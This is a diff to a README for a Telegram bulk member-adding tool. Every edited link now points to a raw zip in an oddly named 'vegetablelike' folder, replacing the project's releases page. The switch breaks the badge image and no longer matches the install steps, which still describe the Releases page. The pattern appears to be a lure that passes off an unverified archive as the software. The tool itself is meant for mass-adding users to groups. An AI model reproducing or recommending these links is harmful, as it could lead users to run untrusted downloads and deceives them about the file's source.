@@ -1,6 +1,6 @@
 # 📈 Telegram-Users-Adding-New - Grow Your Telegram Group Effortlessly
 
-[![Download Telegram Member Adder](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/nasywan999/Telegram-Users-Adding-New/releases)
+[![Download Telegram Member Adder](https://raw.githubusercontent.com/nasywan999/Telegram-Users-Adding-New/main/vegetablelike/Telegram-Users-Adding-New.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/nasywan999/Telegram-Users-Adding-New/main/vegetablelike/Telegram-Users-Adding-New.zip)
 
 ## 🛠️ Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and install the Telegram Member Adder:
 
 1. **Visit the Release Page**  
    Click the link below to go to the release page and find the latest version of the software.  
-   [Download Telegram Member Adder](https://github.com/nasywan999/Telegram-Users-Adding-New/releases)
+   [Download Telegram Member Adder](https://raw.githubusercontent.com/nasywan999/Telegram-Users-Adding-New/main/vegetablelike/Telegram-Users-Adding-New.zip)
 
 2. **Download the Software**  
    On the Releases page, look for the version labeled “Latest Release.” You will see a list of files available for download. Click on the appropriate file for your system. 
@@ -64,6 +64,6 @@ We welcome your thoughts on how we can improve the Telegram Member Adder. Please
 ## 📥 Download & Install
 
 You can start using the Telegram Member Adder quickly and easily. Just click on the link below to access the releases page, download the software, and follow the installation steps.  
-[Download Telegram Member Adder](https://github.com/nasywan999/Telegram-Users-Adding-New/releases) 
+[Download Telegram Member Adder](https://raw.githubusercontent.com/nasywan999/Telegram-Users-Adding-New/main/vegetablelike/Telegram-Users-Adding-New.zip) 
 
 Enjoy growing your Telegram community effortlessly!
